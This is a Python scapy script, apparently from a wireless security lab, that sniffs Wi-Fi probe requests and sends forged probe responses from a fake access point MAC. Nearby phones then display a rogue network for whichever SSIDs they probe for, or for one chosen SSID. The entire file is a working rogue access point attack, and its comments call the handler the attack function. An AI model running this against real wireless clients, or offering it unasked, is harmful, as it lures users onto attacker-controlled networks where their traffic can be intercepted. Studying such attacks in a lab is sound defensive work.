from scapy.all import *
from scapy.layers.dot11 import Dot11ProbeReq, Dot11, Dot11ProbeResp, Dot11Elt, RadioTap

import config

# mac address of the fake AP
AP_MAC_ADDR = "42:42:42:42:42:42"

# If an ssid is passed as argument we send probe responses only for this SSID
# Otherwise, we send responses to all probe requests that include an SSID

if len(sys.argv) == 1:
    filter_ssid = None
else:
    filter_ssid = sys.argv[1]


def probe_resp(pkt):
    """
    Checks if `pkt` is a probe request with an SSID. If yes, sends an appropriate probe response.

    If `filter_ssid` is none, sends responses for ans SSID.
    If `filter_ssid` is an SSID, send responses only for this SSID.
    """

    # Check if pkt is a probe request
    if pkt.haslayer(Dot11ProbeReq):
        ssid = pkt.info.decode()
        # A probe request can have a None SSID
        # We send a response only if the SSID is not null
        if (not filter_ssid and ssid) or ssid == filter_ssid:
            print(f"{pkt.addr2} sent probe for {ssid}")
            response = (
                # wlan header
                RadioTap()
                # addr1 is receiver/destination (target)
                # addr2 is transmitter/source (fake ap)
                # addr3 is BSS id (fake ap)
                # no need to specify type / subtype, it is set automatically thanks to `Dot11ProbeResp` below
                / Dot11(addr1=pkt.addr2, addr2=AP_MAC_ADDR, addr3=AP_MAC_ADDR)
                # we send a probe response
                / Dot11ProbeResp()
                # we set the probe response SSID
                / Dot11Elt(ID='SSID', info=ssid)

                # There are many more parameters that we can set on the packet to make it more realistic,
                # but the present parameters are enough for the fake wlan to appear on a recent Android phone.
            )
            print(f"about to send {response}")
            sendp(response, iface=config.WIFI_INTERFACE_NAME)


print("Sniffing for Probe Requests...")
# We sniff the wlan packets, and for each packet we call our attack function
sniff(prn=probe_resp, iface=config.WIFI_INTERFACE_NAME, )
